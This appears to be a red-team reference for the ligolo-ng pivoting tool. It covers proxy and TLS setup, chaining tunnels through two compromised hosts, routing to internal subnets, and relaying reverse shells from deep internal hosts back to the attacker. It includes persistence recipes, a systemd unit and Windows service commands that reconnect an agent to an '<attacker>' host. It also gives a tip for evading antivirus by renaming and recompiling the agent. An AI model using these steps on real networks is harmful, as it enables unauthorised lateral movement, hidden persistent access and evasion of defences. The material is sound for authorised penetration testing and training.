# ligolo-ng — Pivot Setup Reference

## TLS Certificate Options

```bash
# Self-signed (easiest, use -ignore-cert on agent)
./proxy -selfcert -laddr 0.0.0.0:11601

# Custom cert (avoids -ignore-cert; more opsec)
./proxy -certfile server.crt -keyfile server.key -laddr 0.0.0.0:11601
# Generate cert:
openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
```

## Multiple TUN Interfaces (Multiple Pivots)

Each new pivot gets its own TUN interface:

```bash
# Interface for first pivot
sudo ip tuntap add user $(whoami) mode tun ligolo0
sudo ip link set ligolo0 up

# Interface for second pivot
sudo ip tuntap add user $(whoami) mode tun ligolo1
sudo ip link set ligolo1 up
```

In proxy console:
```
session              # select session 1 (pivot1)
tunnel_start --tun ligolo0

session              # select session 2 (pivot2)
tunnel_start --tun ligolo1
```

Routes:
```bash
sudo ip route add 10.200.1.0/24 dev ligolo0
sudo ip route add 10.200.2.0/24 dev ligolo1
```

## Double Pivot (Chained)

```
Attacker → [TUN ligolo0] → Pivot1 → [TUN ligolo1] → Pivot2 → Internal2
```

Step 1: Setup attacker → pivot1 (standard setup, ligolo0)

Step 2: From pivot1, set up listener to receive agent from pivot2:
```
# In proxy console (session = pivot1):
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp
```

Step 3: On pivot2, connect agent back through pivot1:
```bash
./agent -connect <pivot1_ip>:11602 -ignore-cert
```

Step 4: New session appears in proxy. Select it, start with ligolo1:
```
session              # select pivot2 session
tunnel_start --tun ligolo1
```

Step 5: Add route to pivot2's internal network:
```bash
sudo ip route add 10.200.2.0/24 dev ligolo1
```

## Agent Persistence

### Linux — systemd unit

```ini
[Unit]
Description=ligolo-ng agent
After=network.target

[Service]
ExecStart=/opt/agent -connect <attacker>:11601 -ignore-cert
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
sudo cp agent.service /etc/systemd/system/
sudo systemctl enable --now agent
```

### Windows — as a Service

```powershell
sc.exe create LigoloAgent binPath= "C:\Windows\Temp\agent.exe -connect <attacker>:11601 -ignore-cert" start= auto
sc.exe start LigoloAgent
```

Or using SrvAny (NSSM):
```powershell
nssm install LigoloAgent "C:\Windows\Temp\agent.exe" "-connect <attacker>:11601 -ignore-cert"
nssm start LigoloAgent
```

## Listener Usage (Reverse Connections Through Tunnel)

Use case: catch a reverse shell from deep internal host back to attacker.

```
# In proxy console (session selected):
listener_add --addr 0.0.0.0:9999 --to <attacker_ip>:9999 --tcp
```

Now configure the internal host's reverse shell to connect to `<pivot_ip>:9999` — the listener forwards it to attacker port 9999.

## Interface / Route Cleanup

```bash
sudo ip route del 10.200.1.0/24 dev ligolo
sudo ip link set ligolo down
sudo ip tuntap del mode tun ligolo
```

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| Agent can't connect | Check firewall on port 11601; verify attacker IP reachable from pivot |
| Tunnel traffic drops | Try `tunnel_stop` then `tunnel_start` |
| Route not working | Verify TUN interface is UP and route dev matches interface name |
| Agent killed by AV | Rename binary, compile from source with different imports |
